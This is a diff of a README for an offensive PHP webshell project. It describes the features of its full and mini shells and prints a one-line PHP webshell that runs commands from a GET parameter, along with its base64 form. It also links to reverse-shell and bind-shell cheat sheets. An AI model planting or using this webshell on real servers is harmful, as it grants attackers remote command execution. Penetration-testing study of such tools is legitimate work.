@@ -7,42 +7,38 @@ This webshell comes in two flavours :
 - shell.php : fully featured webshell to exploit
 - mini.php : lightweight, only essential features
 
-
 ### Features
 
-shell.php offers :
+shell.php
 - browse server's directory tree
 - read, edit, delete, upload and download file
 - Execute system commands
 - Execute PHP code
 - Execute MySql queries
 
-mini.php offers :
+mini.php
 - Execute system commands
 - Execute PHP code
 - Upload file
-
 
 ### More content
 
 Another file is available : `mini-b64.txt`
 This is the base64 version of mini.php. It does not contain '+' and '/' chars to avoid URL encoding and other possible issues.
 
-Tiniest PHP shell
-`<?php system($_GET['c'])?>
-PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pPz4=`
+### Even more tricks
 
+###### Tiniest PHP shell
 
-In order to upgrade to a more interactive shell, take a look at these :
+`<?php system($_GET['c'])?>`
+`PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pPz4=`
+
+##### Upgrade to a more interactive shell
 
 PHP reverse shell : https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
-
 PHP bind shell : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md
 
-You will be able to use them with netcat or metasploit's multi/handler
-
-
-Do you still need more ? Take a look at these :
+###### Good resources about shells
 https://www.revshells.com/
 https://yolospacehacker.com/hackersguide/en/?cat=Webshell
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
